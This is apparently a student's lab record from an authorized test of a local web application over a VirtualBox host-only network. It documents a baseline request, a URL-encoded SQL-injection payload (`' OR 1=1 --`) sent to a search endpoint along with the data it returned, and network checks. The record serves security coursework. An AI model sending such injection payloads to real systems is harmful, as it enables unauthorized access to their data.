# Practical Investigation Record

## Purpose

This record captures the practical observations used in the final project. Only authorized laboratory/local-system activity is included.

## Environment

- Windows host running the local Medusa application stack.
- Kali Linux running in VirtualBox.
- VirtualBox Host-Only network: `192.168.56.0/24`.
- Kali host-only address observed: `192.168.56.101`.
- Medusa backend observed listening on TCP port `9000` on the Windows host.

## Test 1 — Baseline search request

Command:

```text
curl -i "http://192.168.56.1:9000/search?q=test"
```

Observed result:

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 2

[]
```

Interpretation: the endpoint was reachable and returned an empty JSON array for the normal test input.

## Test 2 — Crafted search input

Command:

```text
curl -i "http://192.168.56.1:9000/search?q=%27%20OR%201%3D1%20--"
```

Observed result:

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 72

[{"id":1,"name":"Test Item","price":100,"description":"Sample product"}]
```

Interpretation: the crafted input produced a different database-backed result from the baseline request. In the controlled lab context, this behavior is treated as evidence consistent with the documented SQL-injection case and should be reproduced against the intentionally vulnerable fixture before publication.

## Test 3 — Backend availability

Windows-side command:

```text
curl http://localhost:9000
```

Observed result after the backend started:

```text
HTTP/1.1 200 OK
...
Cannot GET /
```

Interpretation: the HTTP server was reachable on port 9000. `Cannot GET /` is an application route response, not evidence that the server is down.

## Network verification

Windows-side checks confirmed that the VirtualBox host-only adapter used `192.168.56.1` and Kali used `192.168.56.101`. The Windows firewall contained an enabled inbound TCP/9000 rule named `Medusa Lab TCP 9000`.

## Important evidence-handling note

The original SSO and Redis evidence should be added only if the corresponding authorized screenshots/logs are available. No fabricated screenshots, tokens, passwords, API keys, or `.env` files are included in this project.
